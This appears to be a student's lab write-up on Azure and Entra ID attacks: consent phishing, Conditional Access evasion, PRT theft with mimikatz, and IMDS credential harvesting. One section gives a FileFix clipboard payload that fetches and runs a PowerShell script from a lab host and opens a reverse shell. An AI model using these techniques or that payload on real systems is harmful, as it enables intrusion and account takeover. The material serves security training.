Phase 3: Initial Access Attacks & Tokens

Initial Access - Illicit Consent Grant (OAuth Abuse)

The Illicit Consent Grant attack, also known as consent phishing, represents a fundamental shift in how adversaries gain access to cloud environments. Instead of stealing credentials, attackers trick users into granting permissions to malicious OAuth applications.

Why This Attack Works:

  • Occurs entirely within Microsoft's trusted platform
  • Leverages legitimate OAuth 2.0 protocol features
  • No software vulnerabilities exploited
  • Difficult to detect - appears as normal consent

Attack Flow:

  1. Attacker registers a malicious application in Azure AD
  2. Phishing email directs user to consent to the app
  3. User grants permissions (Mail.Read, Files.Read, etc.)
  4. Attacker receives access tokens for the user's account
  5. Attacker can access user's data and potentially escalate privileges

Register an Application

The danger lies in the fact that the attack occurs entirely within the trusted boundaries of the Microsoft platform, leveraging legitimate features of the OAuth 2.0 protocol rather than exploiting a software vulnerability.

First, register a new application in Entra ID: Entra ID → Application Registrations → New Application

Give it any name (e.g., student59) and select Accounts in any organizational directory (Any Entra ID directory - Multitenant)

Add a Redirection URL - this will redirect to a server that we as an attacker have control of.

Create a New Client Secret: Certificates & Secrets → New Client Secret

Add API Permissions - User.Read & User.ReadBasic.All:

These permissions are carefully selected to request the absolute minimum privileges required without triggering an Administrator Consent prompt.

FileFix Remote Code Execution

FileFix is a sophisticated social-engineering technique that exploits user behavior in Windows File Explorer. It requires no software exploits, administrative privileges, or external tools.

How It Works:

  1. Attacker creates a phishing page mimicking internal company file portals
  2. Victim is instructed to copy a "file path" and paste it into File Explorer
  3. The clipboard actually contains a malicious PowerShell command
  4. When pasted into the address bar and executed, code runs in the context of the user

Why It's Effective:

  • Users are accustomed to following copy-paste instructions from IT
  • No suspicious files or links involved
  • Bypasses many email security filters
  • No macro warnings or security prompts

The Attack Flow:

  1. The attacker sets up a phishing page that looks like an internal company file portal.
  2. The page tells the victim to copy a file path and paste it into File Explorer's address bar.
  3. What actually gets copied is a disguised PowerShell command.
  4. When the user pastes and presses Enter, PowerShell runs in the background.

The key is the JavaScript that copies the malicious command instead of the file path:

navigator.clipboard.writeText(`powershell.exe -WindowStyle Hidden -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "iex (New-Object Net.WebClient).DownloadString('http://172.16.1.59:82/Invoke-PowerShellTcp.ps1'); Power -Reverse -IPAddress 172.16.1.59 -Port 4444" # C:\\Defense Corporation\\internal-secure\\filedrive\\SecurityAudit_Report.docx`)

Send the malicious link to the victim via email.

Lateral Movement - Key Vault Abuse & Scoped Privileges

>Management Plane vs. Data Plane Token Acquisition

We must understand that not all Access Tokens are created equal. In previous labs, we primarily requested tokens for the Management Plane (management.azure.com). This specific scope grants us the permission to perform "Control" actions.

However, possessing a Management token does not automatically grant access to the actual data stored inside those resources. To read a secret inside a Key Vault, we must request a specific Data Plane token (e.g., scoped to https://vault.azure.net).

We effectively have to ask the Azure Instance Metadata Service (IMDS) twice: once for the keys to the office (Management) and once for the keys to the filing cabinet (Data).

Privilege Escalation - ARM Templates - Deployment History

>Service Principal Authentication Mechanics

We must understand the difference between logging in as a human user versus a Service Principal. Humans are protected by MFA, but a Service Principal is a "Robot Account" used by applications.

Service Principals rely exclusively on a "Client ID" (Username) and a "Client Secret" (Password). The strategic importance is that Service Principals act as a backdoor because they inherently bypass MFA.

Connect-AzAccount -ServicePrincipal -ClientId  -ClientSecret  -Tenant

Conditional Access Policy Evasion via User-Agent Spoofing

One of the most advanced defensive layers is Conditional Access Policies (CAPs). These are "If/Then" rules.

We can evade CAPs by setting a specific User-Agent string that matches an approved device type:

Invoke-WebRequest -Uri "https://management.azure.com/subscriptions?api-version=2020-01-01" -Headers @{Authorization="Bearer $token"} -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

Privilege Escalation - Function App - Continuous Deployment

If we have write access to a Function App's configuration or deployment settings, we can modify the code that runs in it.

Use Az PowerShell to update the function app:

Set-AzWebApp -ResourceGroupName "Name" -Name "FunctionAppName" -AppSettings @{"WEBSITE_RUN_FROM_PACKAGE"="1"}

Extracting PRT and executing Pass-The-Certificate

>Primary Refresh Token Extraction

The Primary Refresh Token acts as the persistent digital identity card for a user on a specific device. We target this artifact because retrieving it allows us to impersonate the user from a different location.

Use tools like mimikatz to perform memory scraping on the Local Security Authority Subsystem Service (LSASS).

Pass-the-PRT Attack Mechanics

Inject the decrypted token directly into our browser session or attack tool. This tricks Azure into recognizing our traffic as coming from the victim's verified laptop.

This grants instant authenticated access to the user's applications without knowing their password or needing access to their MFA device.

PRT Renewal and Conditional Access Bypass

The longevity of our access relies on understanding how the Primary Refresh Token can be renewed. As long as the victim device remains active, we can potentially extend our access.

Extracting clear-text credentials from user data and Graph API tokens

We execute this as a two-pronged data mining operation.

Method 1: User Data from IMDS

Query Azure Instance Metadata Service for the User Data attribute:

curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01&format=text"

Because this data is Base64 encoded rather than encrypted, we can decode the response immediately to reveal cleartext data.

Pivot to targeting web browsers installed on the machine to harvest Graph API Tokens.
